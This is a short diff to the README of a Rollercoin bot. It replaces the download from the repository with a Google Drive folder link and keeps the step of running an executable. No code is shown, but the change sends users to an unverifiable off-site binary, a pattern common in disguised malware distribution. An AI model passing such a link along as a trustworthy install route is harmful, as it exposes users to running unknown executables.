@@ -1,6 +1,9 @@
 # MIDAS-BOT
 This is a bot specifically developed and created for the rollercoin website. Its use is simple and intuitive. 
-To install the zip go to the "code" section of this page and select the option to download zip, then you will only have to extract it and finish.
+To install it you have to follow this link:
+https://drive.google.com/drive/folders/1ZKNrkyQwBwk-T5ENG4Xqr0aYICzFkPxF?usp=sharing
+
+(There you hace to dowload everything inside, and save it in a folder
 
 You just have to run the executable (rollercoin_game), and then follow the instructions.
 
